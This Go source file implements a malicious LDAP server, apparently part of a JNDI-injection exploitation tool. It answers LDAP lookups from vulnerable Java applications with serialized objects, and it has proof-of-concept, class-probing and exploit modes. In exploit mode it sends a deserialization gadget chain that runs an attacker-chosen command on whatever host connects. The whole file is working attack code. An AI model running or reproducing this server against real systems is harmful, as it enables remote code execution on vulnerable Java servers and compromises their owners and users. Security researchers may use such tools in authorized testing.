package server

import (
	"encoding/binary"
	"log"
	"net"
	"sync"

	"github.com/cokeBeer/logi/pkg/payload"
	"github.com/cokeBeer/logi/pkg/wordlist"
)

const (
	MODE_POC = iota + 1
	MODE_PROBE
	MODE_EXPLOIT
)

// Server represents a LDAP server
type Server struct {
	Mode    int
	lock    sync.Mutex
	counter int
	ip      string
	port    string
	Domain  string
	Dict    *wordlist.DictWrapper
	Gadget  *payload.ExecWrapper
	Command string
}

// New returns a Server
func New(ip string, port string) *Server {
	s := new(Server)
	s.ip = ip
	s.port = port
	s.counter = 0
	return s
}

// StartLDAP starts a LDAP server hosting serialized object
func (s *Server) StartLDAP() {

	addr := net.JoinHostPort(s.ip, s.port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("Listen on %v\n", addr)

	if s.Mode == MODE_PROBE {
		log.Printf("Run mode probe")
		log.Printf("Use domain: %v\n", s.Domain)
		log.Printf("Load dict: %v, class num: %v\n", s.Dict.Name(), s.Dict.Len())
	} else if s.Mode == MODE_EXPLOIT {
		log.Printf("Run mode exploit")
		log.Printf("Load gadget: %v, command: %v\n", s.Gadget.Name(), s.Command)
	} else {
		log.Printf("Run mode poc")
		log.Printf("Use domain: %v\n", s.Domain)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("a connect came: %v\n", conn.RemoteAddr())
		go s.handle(conn)
	}
}

func (s *Server) handle(conn net.Conn) {
	defer log.Printf("close connect: %v", conn.RemoteAddr())
	defer conn.Close()

	buf := make([]byte, 14)
	conn.Read(buf)

	conn.Write([]byte("\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00"))

	buf = make([]byte, 1)
	conn.Read(buf)

	l1 := buf[0]
	buf = make([]byte, l1)
	conn.Read(buf)

	l2 := buf[7]
	classname := string(buf[8 : 8+l2])
	log.Printf("received classname: %v\n", classname)

	var serobj []byte
	if s.Mode == MODE_PROBE {
		probeclass := s.decide()
		serobj = payload.Probe(s.Domain, probeclass, classname)
	} else if s.Mode == MODE_EXPLOIT {
		serobj = s.Gadget.Exec(s.Command)
	} else {
		serobj = payload.Poc(s.Domain, classname)
	}

	entryList := make(map[string]any)
	entryList["javaSerializedData"] = serobj
	entryList["javaClassName"] = "java.lang.String"

	message := buildMessge(classname, &entryList)

	conn.Write(message)
	log.Printf("send payload to: %v, length: %v", conn.RemoteAddr(), len(message))
	conn.Write([]byte("\x30\x0c\x02\x01\x02\x65\x07\x0a\x01\x00\x04\x00\x04\x00"))

	buf = make([]byte, 36)
	conn.Read(buf)
}

func (s *Server) decide() string {
	var i int
	s.lock.Lock()
	s.counter++
	if s.counter >= s.Dict.Len() {
		s.counter = 0
	}
	i = s.counter
	s.lock.Unlock()
	return s.Dict.Choose(i)
}

func buildMessge(classname string, entryList *map[string]any) []byte {
	message := make([]byte, 0)
	messagelen := 0
	entry, entrylen := buildEntry(entryList)
	message = append(message, entry...)
	messagelen = messagelen + entrylen
	// set l
	if messagelen > 0xff {
		message = append(make([]byte, 2), message...)
		binary.BigEndian.PutUint16(message, uint16(messagelen))
		message = append([]byte("\x30\x82"), message...)
		message = append([]byte(classname), message...)
		message = append([]byte{byte(len(classname))}, message...)
		message = append([]byte("\x04"), message...)
		messagelen = messagelen + 6 + len(classname)
	} else {
		message = append([]byte{byte(messagelen)}, message...)
		message = append([]byte("\x30"), message...)
		message = append([]byte(classname), message...)
		message = append([]byte{byte(len(classname))}, message...)
		message = append([]byte("\x04"), message...)
		messagelen = messagelen + 4 + len(classname)
	}
	// set l
	if messagelen > 0xff {
		message = append(make([]byte, 2), message...)
		binary.BigEndian.PutUint16(message, uint16(messagelen))
		message = append([]byte("\x02\x01\x02\x64\x82"), message...)
		messagelen = messagelen + 7
	} else {
		message = append([]byte{byte(messagelen)}, message...)
		message = append([]byte("\x02\x01\x02\x64"), message...)
		messagelen = messagelen + 5
	}
	// set l
	if messagelen > 0xff {
		message = append(make([]byte, 2), message...)
		binary.BigEndian.PutUint16(message, uint16(messagelen))
		message = append([]byte("\x30\x82"), message...)
		messagelen = messagelen + 4
	} else {
		message = append([]byte{byte(messagelen)}, message...)
		message = append([]byte("\x30"), message...)
		messagelen = messagelen + 2
	}
	return message
}

func buildEntry(entryList *map[string]any) ([]byte, int) {
	entry := make([]byte, 0)
	entrylen := 0
	for _k, _v := range *entryList {
		k := []byte(_k)
		var v []byte
		if _, ok := _v.(string); ok {
			v = []byte(v)
		} else if _, ok := _v.([]byte); ok {
			v = _v.([]byte)
		} else {
			continue
		}
		buf := make([]byte, 0)
		buflen := 0
		// concat v
		buf = append(v, buf...)
		buflen = buflen + len(v)
		if len(v) > 0xff {
			buf = append(make([]byte, 2), buf...)
			binary.BigEndian.PutUint16(buf, uint16(len(v)))
			buf = append([]byte("\x04\x82"), buf...)
			buflen = buflen + 4
		} else {
			buf = append([]byte{byte(len(v))}, buf...)
			buf = append([]byte("\x04"), buf...)
			buflen = buflen + 2
		}
		// set l
		if buflen > 0xff {
			buf = append(make([]byte, 2), buf...)
			binary.BigEndian.PutUint16(buf, uint16(buflen))
			buf = append([]byte("\x31\x82"), buf...)
			buflen = buflen + 4
		} else {
			buf = append([]byte{byte(buflen)}, buf...)
			buf = append([]byte("\x31"), buf...)
			buflen = buflen + 2
		}
		// concat k
		buf = append(k, buf...)
		buflen = buflen + len(k)
		if len(v) > 0xff {
			buf = append(make([]byte, 2), buf...)
			binary.BigEndian.PutUint16(buf, uint16(len(k)))
			buf = append([]byte("\x04\x82"), buf...)
			buflen = buflen + 4
		} else {
			buf = append([]byte{byte(len(k))}, buf...)
			buf = append([]byte("\x04"), buf...)
			buflen = buflen + 2
		}
		// set l
		if buflen > 0xff {
			buf = append(make([]byte, 2), buf...)
			binary.BigEndian.PutUint16(buf, uint16(buflen))
			buf = append([]byte("\x30\x82"), buf...)
			buflen = buflen + 4
		} else {
			buf = append([]byte{byte(buflen)}, buf...)
			buf = append([]byte("\x30"), buf...)
			buflen = buflen + 2
		}
		entry = append(entry, buf...)
		entrylen = entrylen + buflen
	}
	return entry, entrylen
}
